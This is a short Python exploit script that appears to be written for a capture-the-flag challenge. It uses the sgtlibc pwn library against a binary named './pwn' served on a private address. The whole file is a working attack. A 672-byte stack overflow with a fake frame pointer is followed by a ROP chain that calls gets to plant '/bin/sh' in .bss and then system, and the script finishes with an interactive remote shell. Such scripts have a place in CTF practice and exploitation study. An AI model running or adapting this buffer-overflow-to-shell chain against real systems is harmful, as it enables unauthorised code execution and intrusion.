import sgtlibc
from sgtlibc.gamebox import *
set_config(GameBoxConfig(
    is_local=False,
    file='./pwn',
    remote='192.168.2.0:8888',
    auto_load=True,
    auto_show_rop=True,
    auto_show_summary=True,
    auto_start_game=True,
    auto_load_shell_str=True,
    auto_show_symbols=True
))
s = sgtlibc.Searcher()
elf = client.elf

canary = b''


def exp():
    # overflow position
    data = [b'a' * (672),fakeebp()]
    return data


bss_align20_addr = 0x00601079
payload = exp()
payload += [elf.rop['rdi'], bss_align20_addr, elf.plt['gets']]
payload += [elf.rop['rdi'], bss_align20_addr, elf.plt['system']]
pause()
sl(payload)
sl(b'/bin/sh\x00')
interactive()
